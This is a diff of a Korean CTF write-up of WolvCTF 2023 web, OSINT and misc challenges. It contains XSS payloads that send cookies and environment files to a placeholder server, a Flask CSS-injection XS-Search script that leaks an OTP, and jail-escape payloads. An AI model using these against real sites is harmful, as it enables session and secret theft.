@@ -11,7 +11,7 @@ tags: [ctf, wolvctf_2023, web, osint, misc]
 ***
 
 
-## Zombie 101 (solved)
+## Zombie 101 (100pt)(solved)
 ***
 zombie 시리즈는 `모두 같은 소스코드에 필터링 없는 XSS 문제`로 플레그만 가져오면 됩니다. 하지만 문제마다 `config`의 설정이 살짝살짝 다릅니다. 먼저 `bot.js`는 아래와 같습니다. 봇의 쿠키에 플레그가 담겨있습니다.  
 ```javascript
@@ -52,7 +52,7 @@ PAYLOAD = '<script>location.href="https://YOUR_SEVER/?f="%252bdocument.cookie</s
 <br/>
 
 
-## Zombie 201 (solved)
+## Zombie 201 (352pt)(solved)
 ***
 
 `201`의 `config`는 다음과 같습니다. 이번에는 `httpOnly`가 `true`이기 때문에 `document.cookie`는 안됩니다.
@@ -93,7 +93,7 @@ PAYLOAD = '<script>fetch("/debug").then(function(x){return%2520x.text();}).then(
 <br/>
 
 
-## Zombie 301 (solved)
+## Zombie 301 (484pt)(solved)
 ***
 이번에는 `allowDebug`가 `false`입니다.  
 ```plaintext
@@ -113,7 +113,7 @@ PAYLOAD = '<script>fetch("file:///proc/self/environ").then(function(x){return%25
 <br/>
 
 
-## Zombie 401 (solved)
+## Zombie 401 (487pt)(solved)
 ***
 `401`은 `secret-flag`가 따로 있습니다.
 ```plaintext
@@ -158,7 +158,7 @@ PAYLOAD = '<script>fetch("file:///ctf/app/config.json").then(function(x){return%
 <br/>
 
 
-## Hidden CSS
+## Hidden CSS (495pt)
 ***
 `public-server.js`와 `private-server.js` 2개의 파일이 주어집니다. public은 단순히 url을 입력하면 봇이 동작하는 부분이고 private은 아래와 같습니다. 제약사항으로는 `/css` 엔드포인트의 쿼리 파라미터인 `prefix`의 길이가 20을 넘겨서는 안됩니다. 또한 `res.setHeader`를 통해서 `Content-Type`을 `text/css`로 명시합니다. 그리고 플레그는 `prefix`와 결합하여 전송됩니다.  
 ```javascript
@@ -235,18 +235,146 @@ http://0:1337/css?prefix=p{--test:
 
 
 
-## Adversal
+## Adversal (498pt)
 ***
-추가예정
+이 문제는 `CSS injection`을 이용한 `XS-Search` 문제였습니다. 먼저 아래와 같이 `/otp` 엔드포인트에서 사용자가 `html` 요소를 작성할 수 있습니다. `CSP`가 걸려있고, `otp`는 12글자의 랜덤한 숫자와 영문 조합입니다.  
+```javascript
+// index.js: 26
+...
+
+app.get('/otp', (req, res) => {
+    let defaultAd = `
+        <img src="imgs/logo.png" /> <br/>
+        <link rel="stylesheet" href="style/style.css" />
+        <h3>Get your <a href="https://wolvsec.org/" target="_blank">WolvSec</a> merch!</h3>
+    `
+    let ad = req.query.ad || defaultAd; 
+
+    // Imagine that the OTP gets used somewhere important
+    //  (you will need to exfiltrate it from the admin bot to get the flag)
+    let otp = randomstring.generate({length: 12, charset: 'alphanumeric'});
+
+    res.set("Content-Security-Policy", "script-src 'none'; object-src 'none'; connect-src 'self';");
+
+    res.render('otp', {
+        otp: otp,
+        ad: ad
+    });
+});
+
+...
+
+```
+{: file="index.js"}
+
+![otp](../../../assets/img/2023-03-20/otp.png){: w="700" h="350" }  
 <br/>
 
+그리고 `/visit` 엔드포인트를 통해서 봇이 `/otp?ad=<USER_INPUT>`으로 방문합니다. 그리고 그 페이지에 있는 `otp`를 `req.session.otp`에 저장합니다. 그리고 플레그는 세션에 있는 `otp` 값과 `url` 파라미터로 전달한 `otp` 값이 같으면 볼 수 있습니다.  
+```javascript
+// index.js: 89
+...
+
+app.get('/visit', async (req, res) => {
+    const ad = req.query.ad
+    console.log('received ad: ', ad)
+
+    let url = CHAL_URL + '/otp?ad=' + ad;
+
+    try {
+        console.log('visiting url: ', url)
+        let otp = await visitUrl(url, req.hostname)
+        if(otp != null) {
+            req.session.otp = otp;
+            res.redirect('done.html');
+        } else {
+            res.send('Error: evaluator could not find the OTP element on the page')
+        }
+    } catch (e) {
+        console.log('error visiting: ', url, ', ', e.message)
+        res.send('Error visiting page with your ad: ' + escape(e.message))
+    } finally {
+        console.log('done visiting url: ', url)
+    }
+});
+
+app.get('/flag', (req, res) => {
+    if(req.query.otp && req.session.otp && req.query.otp === req.session.otp) {
+        res.send(FLAG);
+    } else {
+        res.send('Incorrect! <a href="/index.html">Back to home</a>');
+    }
+});
+
+...
+
+```
+{: file="index.js"}
+<br/>
+
+처음 이 문제에 접근했을 때, 분명 `CSS injection`을 쓰겠구나 생각은 했지만 어떻게 한번의 `/visit` 요청으로 12글자를 가져올 수 있느냐였죠. 왜냐하면 일반적인 `CSS injection` 문제의 경우 반복된 요청으로 한 글자씩 특성 선택자를 이용하여 비교하고 append하는 방식이지만 이 문제의 경우는 `/visit`으로 요청할 때마다 `otp`가 바뀝니다.  
+
+디스코드에서 다른 분이 풀이를 올려주셨는데 어떻게하면 이렇게 생각하는지 모르겠네요🧐  
+```python
+# https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection
+
+from flask import Flask, request
+import string
+import time
+
+app = Flask(__name__)
+
+URL = 'http://<YOUR_SERVER>'
+OTP = ''
+
+...
+
+@app.route('/<int:style_i>')
+def style(style_i: int):
+    global OTP
+    css = ''
+    while len(OTP) != style_i:
+        time.sleep(0.5 * style_i)
+    for c in string.digits + string.ascii_letters:
+        css += f'input[name=otp][value^={OTP}{c}] {% raw %}{{ background-image: url({URL}/leak?otp={OTP}{c}); }}{% endraw %}\n'
+    return css, 200, {'Content-Type': 'text/css'}
+
+
+@app.route('/leak')
+def leak():
+    global OTP
+    OTP = request.args['otp']
+    return 'OK'
+
+if __name__ == '__main__':
+    app.run(host='::', port=8000)
+```
+{: file='exploit.py'}
+<br/>
+
+아이디어는 이렇습니다.  
+1. 12개의 `link`태그를 작성하여 봇이 방문하게 합니다.
+2. `/0`부터 `/11`까지 `link`태그에 의해서 우리의 서버로 요청이 오는데 `/0` 요청부터 특성 선택자를 이용한 `CSS injection` 페이로드를 반환합니다.
+3. `/0`의 경우 `sleep`을 하지않고 건너뛰기 때문에 가장먼저 매칭되는 `otp`의 첫 글자를 `/leak`으로 요청을 보내고 전역 변수인 `OTP`에 이 값을 저장합니다.
+4. 그러면 `sleep`하고 있던 다음 엔드포인트인 `/1`이 `while` 문을 탈출하고 `CSS injection` 페이로드를 반환합니다. 이 과정을 반복하게 됩니다.
+<br/>
+
+아래와 같은 `link`태그들을 보내주면 정상적으로 `XS-search`를 성공한 모습을 볼 수 있습니다.  
+![link](../../../assets/img/2023-03-20/link.png){: w="800" h="400" }  
+<br/>
+
+![search](../../../assets/img/2023-03-20/search.png){: w="800" h="400" }  
+<br/>
+
+다시 보면서 알게되었는데 `/otp` 엔드포인트에서 위의 `link`태그를 적어주면 브라우저에 의해서 `CORB`가 걸리는데 봇이 방문하면 걸리지 않습니다... `headless` 때문인지 잘 모르겠네요...(아시는 분 있으면 댓글 달아주세요)  
+<br/>
 
 
 # OSINT
 ***
 
 
-## WannaFlag I: An Introduction (solved)
+## WannaFlag I: An Introduction (188pt)(solved)
 ***
 ![description1](../../../assets/img/2023-03-20/description1.png){: w="500" h="250" }  
 <br/>
@@ -272,7 +400,7 @@ nc 명령어로 접속해보면 처음에는 바로 플레그를 알려주는줄
 <br/>
 
 
-## WannaFlag II: Payments
+## WannaFlag II: Payments (348pt)
 ***
 ![description2](../../../assets/img/2023-03-20/description2.png){: w="500" h="250" }  
 <br/>
@@ -286,7 +414,7 @@ nc 명령어로 접속해보면 처음에는 바로 플레그를 알려주는줄
 <br/>
 
 
-## WannaFlag III: Infiltration
+## WannaFlag III: Infiltration (318pt)
 ***
 ![description3](../../../assets/img/2023-03-20/description3.png){: w="500" h="250" }  
 <br/>
@@ -304,7 +432,7 @@ nc 명령어로 접속해보면 처음에는 바로 플레그를 알려주는줄
 <br/>
 
 해당 사이트에 접속하여 플레그를 얻을 수 있습니다.  
-![spin](../../../assets/img/2023-03-20/spin.png){: w="700" h="350" }  
+![spin](../../../assets/img/2023-03-20/spin.png){: w="800" h="400" }  
 <br/>
 
 3을 풀어야 4,5가 나와서 이 문제들은 못 본 게 아쉽네요. 4,5에 대한 풀이는 레퍼런스를 참고하시면 되겠습니다😁
@@ -314,7 +442,7 @@ nc 명령어로 접속해보면 처음에는 바로 플레그를 알려주는줄
 
 # Misc
 ***
-## yellsatjavascript (solved)
+## yellsatjavascript (364pt)(solved)
 ***
 소스코드는 아래와 같습니다. `flag`, `.`, `{example}`는 사용하지 못합니다.  
 ```javascript
@@ -356,11 +484,11 @@ console['log'](process['env'])
 {: file='solution.js'}
 <br/>
 
-![javascript](../../../assets/img/2023-03-20/javascript.png){: w="700" h="350" }  
+![javascript](../../../assets/img/2023-03-20/javascript.png){: w="800" h="400" }  
 <br/>
 
 
-## yellsatpython
+## yellsatpython (451pt)
 ***
 `pyjail`문제였는데 결정적으로 `.`이 필터링 되있어서 일반적인 `''.__class__.__xxx__` 이런건 안되었죠. 그래서 어떻게 해야할지 고민했던 문제입니다.  
 ```python
@@ -412,9 +540,13 @@ next(open("/home/user/flag"+chr(46)+"txt"))
 {: file='solution.py'}
 <br/>
 
-![python](../../../assets/img/2023-03-20/python.png){: w="700" h="350" }  
+![python](../../../assets/img/2023-03-20/python.png){: w="800" h="400" }  
 <br/>
 
+# 잡설
+***
+`Web`의 난이도가 있는 2문제는 서버를 호스팅해주고 `css`적인 요소가 다분해서 익숙하지 않았던 것 같네요. 좀 더 열심히 해야겠습니다. 그리고 OSINT는 재밌네요.
+<br/>
 
 # Reference
 - [https://enscribe.dev/ctfs/wolv23/osint/wannaflag/](https://enscribe.dev/ctfs/wolv23/osint/wannaflag/)
